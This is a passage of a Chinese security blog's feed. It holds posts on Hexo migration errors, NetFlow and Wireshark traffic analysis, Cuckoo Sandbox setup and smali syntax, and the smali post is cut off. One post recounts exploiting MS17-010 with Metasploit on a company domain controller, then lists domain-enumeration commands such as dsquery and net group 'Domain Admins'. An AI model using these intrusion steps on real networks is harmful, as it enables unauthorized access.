(/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:693:18)</span><br><span class="line">    at Promise._fulfill (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:638:18)</span><br><span class="line">    at Promise._resolveCallback (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:432:57)</span><br><span class="line">    at Promise._settlePromiseFromHandler (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:524:17)</span><br><span class="line">    at Promise._settlePromise (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:569:18)</span><br><span class="line">    at Promise._settlePromise0 (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:614:10)</span><br><span class="line">    at Promise._settlePromises (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:693:18)</span><br><span class="line">    at Promise._fulfill (/Users/zering/hexo/node_modules/bluebird/js/release/promise.js:638:18)</span><br></pre></td></tr></table></figure><p>Google后发现是因为node版本过高，卸载最新版node14.9，安装node12.18.3</p><ul><li>若报如下错误</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git@github.com: Permission denied (publickey).</span><br><span class="line">fatal: 无法读取远程仓库。</span><br><span class="line"></span><br><span class="line">请确认您有正确的访问权限并且仓库存在。</span><br><span class="line">FATAL Something&apos;s wrong. Maybe you can find the solution here: http://hexo.io/docs/troubleshooting.html</span><br><span class="line">Error: git@github.com: Permission denied (publickey).</span><br><span class="line">fatal: 无法读取远程仓库。</span><br></pre></td></tr></table></figure><p>采取如下措施</p><p>需要将 <code>文章</code> 与 <code>.deploy_git</code> 清干净。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">sudo rm -rf .deploy_git</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/white_idiot/article/details/80685990" target="_blank" rel="noopener">【GitHub】创建Git分支将Hexo博客迁移到其它电脑</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;备份原文件&quot;&gt;&lt;a href=&quot;#备份原文件&quot; class=&quot;headerlink&quot; title=&quot;备份原文件&quot;&gt;&lt;/a&gt;备份原文件&lt;/h2&gt;&lt;p&gt;需要转移的文件有：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;文件(夹)&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;scaffolds/&lt;/td&gt;
&lt;td&gt;博客文章模板&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;source/&lt;/td&gt;
&lt;td&gt;所有的博客文章&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;themes/&lt;/td&gt;
&lt;td&gt;网站主题&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.gitignore&lt;/td&gt;
&lt;td&gt;push时需忽略的文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;_config.yml&lt;/td&gt;
&lt;td&gt;站点配置文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;package.json&lt;/td&gt;
&lt;td&gt;依赖包的名称和版本号&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;由于配置文件和主题文件需要经常更改，采用github创建博客分支的方式进行备份。&lt;/p&gt;
    
    </summary>
    
      <category term="hexo" scheme="https://fl4g.cn/categories/hexo/"/>
    
    
      <category term="博客迁移" scheme="https://fl4g.cn/tags/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
  <entry>
    <title>流量分析入门</title>
    <link href="https://fl4g.cn/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/"/>
    <id>https://fl4g.cn/2018/07/12/流量分析入门/</id>
    <published>2018-07-12T06:34:19.000Z</published>
    <updated>2020-09-02T07:53:18.460Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NetFlow"><a href="#NetFlow" class="headerlink" title="NetFlow"></a>NetFlow</h2><p>NetFlow是一种数据交换方式，由思科于1990年开发。其工作原理是：NetFlow利用标准的交换模式处理数据流的第一个IP包数据，生成NetFlow缓存，随后同样的数据基于缓存信息在同一个数据流中进行传输，不再匹配相关的访问控制等策略，NetFlow缓存同时包含了随后数据流的统计信息。<br><a id="more"></a></p><h3 id="NetFlow输出格式"><a href="#NetFlow输出格式" class="headerlink" title="NetFlow输出格式"></a>NetFlow输出格式</h3><p>NetFlow输出格式为报头+一系列Flow流。报头包含序列号、记录数、系统时间等，Flow流包含IP地址、端口、路由信息等。</p><p>一个IP数据包的Flow流至少定义了7个关键元素：</p><ul><li>源IP地址；</li><li>目的IP地址；</li><li>源端口号；</li><li>目的端口号；</li><li>第三层协议类型；</li><li>TOS字段；</li><li>网络设备输入/输出的逻辑端口。</li></ul><p>OSSIM提供可视化NetFlow图形界面，如下图：<br><img src="/2018/07/12/流量分析入门/NetFlow.png" alt=""></p><h3 id="NetFlow监测恶意代码"><a href="#NetFlow监测恶意代码" class="headerlink" title="NetFlow监测恶意代码"></a>NetFlow监测恶意代码</h3><p>NetFlow数据流获取方便，当网络正常运行时，NetFlow数据流是有一定的规律性的，当网络中存在异常流量时，网络流量会发生异常的波动。<br>监测蠕虫的策略：选取几个不同时间段，若时间段内符合特征的Flow超过上限值，则为病毒。</p><h3 id="反应网络运行的核心参数"><a href="#反应网络运行的核心参数" class="headerlink" title="反应网络运行的核心参数"></a>反应网络运行的核心参数</h3><ul><li>平均每秒流量：如果网络内部存在大流量的攻击或P2P等大流量的下载等异常流量时，其数值会比正常时大很多。</li><li>平均每秒包数：大部分的异常流量都会产生非常多的数据包数。</li><li>数据包大小分布：64字节左右的小包和1500字节左右的大包的分布比例较小，小包过多，可能存在扫描、攻击行为，大包过多可能存在消耗带宽资源的大包DOS攻击行为。<br>*平均包长：网络内的平均包长会在500-700字节左右。</li><li>TCP会话数、UDP会话数、IP地址个数、MAC地址个数。。。</li></ul><h2 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h2><p> WireShark是目前世界上最流行的网络分析工具，如下图：<br><img src="/2018/07/12/流量分析入门/WireShark.png" alt=""></p><h3 id="界面详解"><a href="#界面详解" class="headerlink" title="界面详解"></a>界面详解</h3><p>1.过滤器规则：</p><ul><li>tcp-&gt;只显示TCP协议的记录；</li><li>http-&gt;只看HTTP协议的记录；</li><li>ip.src ==192.168.1.102 -&gt;显示源地址为192.168.1.102的记录；</li><li>ip.dst==192.168.1.102 -&gt;目标地址为192.168.1.10的记录；</li><li>ip.addr == 42.121.252.58 -&gt;只显示与某主机的通信；</li><li>tcp.port ==80-&gt;端口为80的；</li><li>tcp.srcport == 80 -&gt;只显示TCP协议的源端口为80的；</li><li>http.request.method==”GET”  -&gt;只显示HTTP GET方法的；</li><li>eth.type == 0x806-&gt;只显示ARP报文，这个字段的值表示是ARP报文，如果是ip报文此值为0x8000（可在表达式中选取对应的16进制值）。</li></ul><p>2.封包列表：<br>封包列表的面板中显示，编号，时间戳，源地址，目标地址，协议，长度，以及封包信息。</p><p>3.封包的详细信息：<br>在封包信息中，每行对应的含义及在OSI模型中的对应关系如下：</p><ul><li>Frame:   物理层的数据帧概况  -&gt;对应OSI七层模型中的【物理层】</li><li>Ethernet II: 数据链路层以太网帧头部信息  -&gt;对应OSI七层模型中的【数据链路层】</li><li>Internet Protocol Version 4: 互联网层IP包头部信息  -&gt;对应OSI七层模型中的【网络层】</li><li>Transmission Control Protocol:  传输层T的数据段头部信息，此处是TCP  -&gt;对应OSI七层模型中的【传输层】</li><li>Hypertext Transfer Protocol:  应用层的信息，此处是HTTP协议  -&gt;对应OSI七层模型中的【应用层】</li></ul><h3 id="WireShark统计模块"><a href="#WireShark统计模块" class="headerlink" title="WireShark统计模块"></a>WireShark统计模块</h3><h4 id="捕获文件的属性"><a href="#捕获文件的属性" class="headerlink" title="捕获文件的属性"></a>捕获文件的属性</h4><p><img src="/2018/07/12/流量分析入门/文件属性.PNG" alt=""><br>这一菜单简单收集所有抓包数据，在定义了过滤条件的时候，将呈现过滤后的数据。当想要知道每秒的平均报文数或是字节数时，可以使用此工具。</p><h4 id="Endpoint"><a href="#Endpoint" class="headerlink" title="Endpoint"></a>Endpoint</h4><p><img src="/2018/07/12/流量分析入门/统计_Endpoints.png" alt=""><br>此窗口中，能够看到第2,3,4层的endpoints，也就是以太网，IP, TCP或UDP。查看收发大量数据流的IP地址。</p><h4 id="Conversations"><a href="#Conversations" class="headerlink" title="Conversations"></a>Conversations</h4><p><img src="/2018/07/12/流量分析入门/Conversations.PNG" alt=""><br>显示2层以太网统计数据，第3层IP统计数据，或第4层TCP或UDP统计数据，网络会话是两个指定终端之间的数据流。例如，IP会话是两个IP地址之间的所有数据流，TCP会话包含了所有TCP连接。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/Chilam007/p/6973990.html" target="_blank" rel="noopener"> 抓包工具 - Wireshark（详细介绍与TCP三次握手数据分析）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;NetFlow&quot;&gt;&lt;a href=&quot;#NetFlow&quot; class=&quot;headerlink&quot; title=&quot;NetFlow&quot;&gt;&lt;/a&gt;NetFlow&lt;/h2&gt;&lt;p&gt;NetFlow是一种数据交换方式，由思科于1990年开发。其工作原理是：NetFlow利用标准的交换模式处理数据流的第一个IP包数据，生成NetFlow缓存，随后同样的数据基于缓存信息在同一个数据流中进行传输，不再匹配相关的访问控制等策略，NetFlow缓存同时包含了随后数据流的统计信息。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="工具使用" scheme="https://fl4g.cn/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="NetFlow" scheme="https://fl4g.cn/tags/NetFlow/"/>
    
      <category term="WireShark" scheme="https://fl4g.cn/tags/WireShark/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试-公司内网</title>
    <link href="https://fl4g.cn/2018/06/28/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%85%AC%E5%8F%B8%E5%86%85%E7%BD%91/"/>
    <id>https://fl4g.cn/2018/06/28/域渗透-公司内网/</id>
    <published>2018-06-28T00:43:04.000Z</published>
    <updated>2020-09-02T07:53:18.452Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-问题发现"><a href="#0x01-问题发现" class="headerlink" title="0x01 问题发现"></a>0x01 问题发现</h2><p>前段时间在公司内网搭建了OSSIM，对公司10.10.66.1/24网段进行扫描，发现10.10.66.239存在严重漏洞，如下图：<br><img src="/2018/06/28/域渗透-公司内网/漏洞.PNG" alt=""><br><a id="more"></a></p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>直接打开kali中神器msf，里面已经有ms17-010的poc，利用后获取meterpreter，如下图：<br><img src="/2018/06/28/域渗透-公司内网/meterpreter.PNG" alt=""></p><p>查看权限，直接为system权限。</p><p><img src="/2018/06/28/域渗透-公司内网/getuid.PNG" alt=""></p><p>其他查看信息的命令不一一列举。</p><p>进入cmd，发现kali控制台显示乱码，使用chcp 65001命令解决：</p><p><img src="/2018/06/28/域渗透-公司内网/乱码.PNG" alt=""></p><p>查看systeminfo信息，发现是域控。。。。。</p><p><img src="/2018/06/28/域渗透-公司内网/域控.PNG" alt=""></p><h2 id="0x02-域信息收集"><a href="#0x02-域信息收集" class="headerlink" title="0x02 域信息收集"></a>0x02 域信息收集</h2><p>windows server机器，使用dsget和dsquery进行域信息收集。<br>使用命令查看全域信息，内容太多，就不截图了<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery * -limit <span class="number">0</span> -attr *</span><br></pre></td></tr></table></figure></p><hr><p>CN, OU, DC 都是 LDAP 连接服务器的端字符串中的区别名称（DN, distinguished   name）</p><pre><code>DC (Domain Component)CN (Common Name)OU (Organizational Unit)</code></pre><p>例如：CN=test,OU=developer,DC=domainname,DC=com</p><p>在上面的代码中 cn=test 可能代表一个用户名，ou=developer 代表一个 active directory 中的组织单位。这句话的含义可能就是说明 test 这个对象处在domainname.com 域的 developer 组织单元中</p><hr><p>查看域控制器，这里已经是域控制器，就不查看了。域控制器命令<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery server -limit <span class="number">0</span> | dsget server -dn -desc -dnsname -site -isgc</span><br></pre></td></tr></table></figure></p><p>其dsquery和dsget命令不一一列举。</p><p>使用net查看命令查看域信息。<br>net group /do</p><p><img src="/2018/06/28/域渗透-公司内网/net_group.PNG" alt=""></p><p>查看Domain Admins组成员，使用dsquery同样可以查询。<br>net group “Domain Admins” /do</p><p><img src="/2018/06/28/域渗透-公司内网/Domain_Admins.PNG" alt=""></p><p>在上面，我们使用net view查看信息时报错：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System error <span class="number">6118</span> has occurred.</span><br><span class="line"></span><br><span class="line">The list of servers <span class="keyword">for</span> this workgroup is <span class="keyword">not</span> currently available</span><br></pre></td></tr></table></figure></p><p>需要从services.msc中打开Computer Browser，先将域管理员用户打开。</p><h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>公司内网，就不使用mimikatz进行获取密码了。下班了，其他情况日后再说。<br>黄金票据，白银票据等内容可以查看此博客：<br><a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">域渗透相关</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-问题发现&quot;&gt;&lt;a href=&quot;#0x01-问题发现&quot; class=&quot;headerlink&quot; title=&quot;0x01 问题发现&quot;&gt;&lt;/a&gt;0x01 问题发现&lt;/h2&gt;&lt;p&gt;前段时间在公司内网搭建了OSSIM，对公司10.10.66.1/24网段进行扫描，发现10.10.66.239存在严重漏洞，如下图：&lt;br&gt;&lt;img src=&quot;/2018/06/28/域渗透-公司内网/漏洞.PNG&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://fl4g.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://fl4g.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网" scheme="https://fl4g.cn/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Cuckoo-Sandbox学习-安装篇</title>
    <link href="https://fl4g.cn/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/"/>
    <id>https://fl4g.cn/2018/06/06/Cuckoo-Sandbox学习-安装篇/</id>
    <published>2018-06-06T06:11:45.000Z</published>
    <updated>2020-09-02T07:53:18.449Z</updated>
    
    <content type="html"><![CDATA[<p>Cuckoo Sandbox是一个开源的恶意文件自动化分析系统，通过Cuckoo Sandbox可以方便地帮助安全研究人员验证恶意程序的特征信息。</p><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>本人在vmware中建立两个虚拟机，一个host，一个guest。<br>VMware 12 Pro<br>ubuntu-16.04.1-desktop-amd64<br>window7-64bit<br><a id="more"></a></p><h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><p>使用vmware安装ubuntu-16.04.1-desktop-amd64，添加2个网卡，一个NAT模式，一个内网网卡。<br><img src="/2018/06/06/Cuckoo-Sandbox学习-安装篇/网卡-ubuntu.PNG" alt=""></p><p>依赖库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python python-pip python-dev libffi-dev libssl-dev</span><br><span class="line">$ sudo apt-get install python-virtualenv python-setuptools</span><br><span class="line">$ sudo apt-get install libjpeg-dev zlib1g-dev swig</span><br></pre></td></tr></table></figure></p><p>为了使用基于Django的Web界面,使用PostgreSQL作为数据库，需要安装MongoDB和PostgreSQL。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install mongodb</span><br><span class="line">$ sudo apt-get install postgresql libpq-dev</span><br></pre></td></tr></table></figure></p><p>建议首先升级pip和setuptools库，因为它们经常过时，导致试图安装Cuckoo时出现问题<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pip install -U pip setuptools</span><br></pre></td></tr></table></figure></p><hr><p>若使用virtual box则创建一个cuckoo用户，将其添加到vboxusers组里<font color="red">（VirtualBox安装后创建）</font>。确保运行Cuckoo的用户与用于创建和运行虚拟机的用户相同（至少在VirtualBox的情况下），否则Cuckoo将无法识别和启动这些虚拟机。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo adduser cuckoo</span><br><span class="line">$ sudo usermod -a -G vboxusers cuckoo</span><br></pre></td></tr></table></figure></p><p>安装VirtualBox<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install virtualbox</span><br></pre></td></tr></table></figure></p><hr><h2 id="安装Cuckoo"><a href="#安装Cuckoo" class="headerlink" title="安装Cuckoo"></a>安装Cuckoo</h2><p>使用一条命令安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pip install -U cuckoo</span><br></pre></td></tr></table></figure></p><p>部分依赖需要翻墙，安装成功如下：<br><img src="/2018/06/06/Cuckoo-Sandbox学习-安装篇/install.PNG" alt=""></p><p>如果在本地使用virtual box则切换cuckoo用户并运行，<br><img src="/2018/06/06/Cuckoo-Sandbox学习-安装篇/run.PNG" alt=""></p><p>从中可以看出配置文件路径为<em>/home/cuckoo/.cuckoo/conf</em>，工作目录路径可以修改，.cuckoo为隐藏目录，使用<code>ctrl+h</code>查看隐藏文件。</p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>几个主要的配置文件：</p><ul><li>cuckoo.conf：用于配置常规行为和分析选项。</li><li>auxiliary.conf：用于启用和配置辅助模块。</li><li>\<machinery>.conf：用于定义虚拟化软件的选项（该文件与您在cuckoo.conf中选择的机器模块名称相同,virtualbox.conf和vmware.conf）。</machinery></li><li>memory.conf：波动配置。</li><li>processing.conf：用于启用和配置处理模块。</li><li>reporting.conf：用于启用或禁用报告格式。</li></ul><h2 id="客户机安装及配置"><a href="#客户机安装及配置" class="headerlink" title="客户机安装及配置"></a>客户机安装及配置</h2><p>使用vmware安装windows7 64bit，配置一个内网网卡。<br>查看ubuntu16.04.1的ip地址，配置window7客户机的ipv4地址的默认网关和DNS地址为ubuntu的ip地址，如下：<br><img src="/2018/06/06/Cuckoo-Sandbox学习-安装篇/ip-windows7.PNG" alt=""></p><p>安装python2.7.10，并关闭windows防火墙和自动更新，原因为他们可能影响恶意软件的行为。<br><img src="/2018/06/06/Cuckoo-Sandbox学习-安装篇/win7配置.PNG" alt=""></p><p>为了正常运行，需要配置如下一些选项。</p><ul><li>启用自动登录</li><li>启用远程RPC</li><li>关闭分页（可选）</li><li>禁用屏幕保护程序（可选）</li></ul><p>在Windows 7中，以管理员权限打开管理命令提示符，输入以下命令以启用自动登录和远程RPC。<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg add "hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultUserName /d &lt;USERNAME&gt; /t REG_SZ /f</span><br><span class="line">reg add "hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /d &lt;PASSWORD&gt; /t REG_SZ /f</span><br><span class="line">reg add "hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon" /v AutoAdminLogon /d <span class="number">1</span> /t REG_SZ /f</span><br><span class="line">reg add "hklm\system\CurrentControlSet\Control\TerminalServer" /v AllowRemoteRPC /d <span class="number">0</span>x01 /t REG_DWORD /f</span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /d <span class="number">0</span>x01 /t REG_DWORD /f</span><br></pre></td></tr></table></figure></p><p>前两条命令里的 \<username> 和 \<password> 为自己的账户和密码。</password></username></p><p>找到之前安装的cuckoo路径下的agent/agent.py,并将其放到win7的启动目录下，<code>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>，把agent.py后缀改为agent.pyw，这样程序启动就不会有GUI窗口。</p><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>很多恶意软件都需要访问网络才可以正常运行，因此需要配置windows主机上网，使用host主机开启流量转发、用 iptables 做地址转换（NAT）规则。</p><p>临时开启ip转发功能方式，系统重启之后便失效：</p><ul><li>sudo sysctl -w net.ipv4.ip_forward=1</li><li>sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward</li></ul><p>若要重启后仍然有效，则需修改配置文件/etc/sysctl.conf，去掉net.ipv4.ip_forward=1 前的注释，之后执行如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -p /etc/sysctl.conf</span><br></pre></td></tr></table></figure></p><p>然后配置Iptables的规则:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -A FORWARD -o eth0 -i vboxnet0 -s 192.168.56.0/24 -m conntrack --ctstate NEW -j ACCEPT</span><br><span class="line">sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">sudo iptables -A POSTROUTING -t nat -j MASQUERADE</span><br><span class="line"></span><br><span class="line">sudo vim /etc/network/interfaces</span><br><span class="line">编辑 Ubuntu 的网络配置文件 /etc/network/interfaces ，在文件末尾添加以下两行：</span><br><span class="line">pre-up iptables-restore &lt; /etc/iptables.rules #开机时启用 iptables 规则</span><br><span class="line">post-down iptables-save &gt; /etc/iptables.rules #关机前保存当前所有的 iptables 规则</span><br></pre></td></tr></table></figure></p><p>效果如下：<br><img src="/2018/06/06/Cuckoo-Sandbox学习-安装篇/ping.PNG" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Cuckoo Sandbox是一个开源的恶意文件自动化分析系统，通过Cuckoo Sandbox可以方便地帮助安全研究人员验证恶意程序的特征信息。&lt;/p&gt;
&lt;h2 id=&quot;安装环境&quot;&gt;&lt;a href=&quot;#安装环境&quot; class=&quot;headerlink&quot; title=&quot;安装环境&quot;&gt;&lt;/a&gt;安装环境&lt;/h2&gt;&lt;p&gt;本人在vmware中建立两个虚拟机，一个host，一个guest。&lt;br&gt;VMware 12 Pro&lt;br&gt;ubuntu-16.04.1-desktop-amd64&lt;br&gt;window7-64bit&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="工具使用" scheme="https://fl4g.cn/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="Cickoo Sandbox" scheme="https://fl4g.cn/tags/Cickoo-Sandbox/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向-smali语法</title>
    <link href="https://fl4g.cn/2018/06/01/Android%E9%80%86%E5%90%91-smali%E8%AF%AD%E6%B3%95/"/>
    <id>https://fl4g.cn/2018/06/01/Android逆向-smali语法/</id>
    <published>2018-06-01T02:56:06.000Z</published>
    <updated>2020-09-02T07:53:18.449Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h2><p>DVM运行Dalvik字节码，可执行文件格式dex(dalvik executable)，有点类似于机器码。DVM基于寄存器，JVM基于栈。</p><h2 id="smali语法"><a href="#smali语法" class="headerlink" title="smali语法"></a>smali语法</h2><a id="more"></a><h3 id="变量和参数寄存器命名方式"><a href="#变量和参数寄存器命名方式" class="headerlink" title="变量和参数寄存器命名方式"></a>变量和参数寄存器命名方式</h3><table><thead><tr><th style="text-align:center">v命名法</th><th style="text-align:center">p命名法</th><th style="text-align:center">寄存器含义</th></tr></thead><tbody><tr><td style="text-align:center">v0</td><td style="text-align:center">v0</td><td style="text-align:center">第一个局部变量寄存器</td></tr><tr><td style="text-align:center">…</td><td style="text-align:center">…</td><td style="text-align:center">中间的局部变量寄存器</td></tr><tr><td style="text-align:center">vM-N</td><td style="text-align:center">p0</td><td style="text-align:center">第一个参数寄存器（通常为调用对象）</td></tr><tr><td style="text-align:center">…</td><td style="text-align:center">…</td><td style="text-align:center">中间的参数寄存器</td></tr><tr><td style="text-align:center">vM-1</td><td style="text-align:center">pN-1</td><td style="text-align:center">第N个参数寄存器</td></tr></tbody></table><p>通常使用p命名法进行记录。</p><h3 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h3><table><thead><tr><th style="text-align:center">语法</th><th style="text-align:center">类型</th></tr></thead><tbody><tr><td style="text-align:center">—-</td><td style="text-align:center">——-</td></tr><tr><td style="text-align:center">V</td><td style="text-align:center">void</td></tr><tr><td style="text-align:center">Z</td><td style="text-align:center">boolean</td></tr><tr><td style="text-align:center">B</td><td style="text-align:center">byte</td></tr><tr><td style="text-align:center">S</td><td style="text-align:center">short</td></tr><tr><td style="text-align:center">C</td><td style="text-align:center">char</td></tr><tr><td style="text-align:center">I</td><td style="text-align:center">int</td></tr><tr><td style="text-align:center">J</td><td style="text-align:center">long</td></tr><tr><td style="text-align:center">F</td><td style="text-align:center">float</td></tr><tr><td style="text-align:center">D</td><td style="text-align:center">double</td></tr><tr><td style="text-align:center">L</td><td style="text-align:center">java类</td></tr><tr><td style="text-align:center">[</td><td style="text-align:center">数组</td></tr></tbody></table><p><strong>注：</strong></p><ul><li>变量存放在寄存器中，寄存器为32位，支持任何类型，其中long，double是64位，使用两个相邻的寄存器。</li><li>[x表示一维数组，x代表基本类型，如[I代表int[],[[x代表二维数组。</li><li>Java语言存在大量对象，java.lang.String表示为<em>Ljava/lang/String;</em>；分号一定要加上。</li></ul><h3 id="方法和字段"><a href="#方法和字段" class="headerlink" title="方法和字段"></a>方法和字段</h3><h4 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#direct/virtual methods</span><br><span class="line">.method &lt;访问权限&gt; [修饰关键字] &lt;方法原型&gt;</span><br><span class="line">    &lt;.registers&gt;</span><br><span class="line">    [.param]</span><br><span class="line">    [.prologue]</span><br><span class="line">    [.line]</span><br><span class="line">    &lt;.local&gt;</span><br><span class="line">    &lt;代码体&gt;</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><ul><li>#direct/virtual methods是注释，是baksmali添加的，访问权限和修饰关键字跟字段是一样的。</li><li>方法原型描述了方法的名称、参数与返回值。<ul><li>.registers 指令指定了方法中寄存器的总数,这个数量是参数和本地变量总和。</li><li>.param表明了方法的参数，每个.param指令表示一个参数，方法使用了几个参数就有几个.parameter指令。</li><li>.prologue指定了代码的开始处，混淆过的代码可能去掉了该指令。</li><li>.line指明了该处代码在源代码中的行号，同样，混淆后的代码可能去掉了行号。</li><li>.local 使用这个指定表明方法中非参寄存器</li></ul></li></ul><h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><p>方法调用格式：Lpackage/name/ObjectName;-&gt;MethodName(III)Z<br>等价于bool package.name.ObjectName.MethodName（int,int,int）<br>例子：<br>method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/Stirng<br>等价于<br>String method(int,int[][],int,String,Object[])</p><h4 id="字段调用"><a href="#字段调用" class="headerlink" title="字段调用"></a>字段调用</h4><p>格式：Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;<br>等价于：package.name.ObjectName.FieldName</p><h3 id="头信息-类的主体信息"><a href="#头信息-类的主体信息" class="headerlink" title="头信息-类的主体信息"></a>头信息-类的主体信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 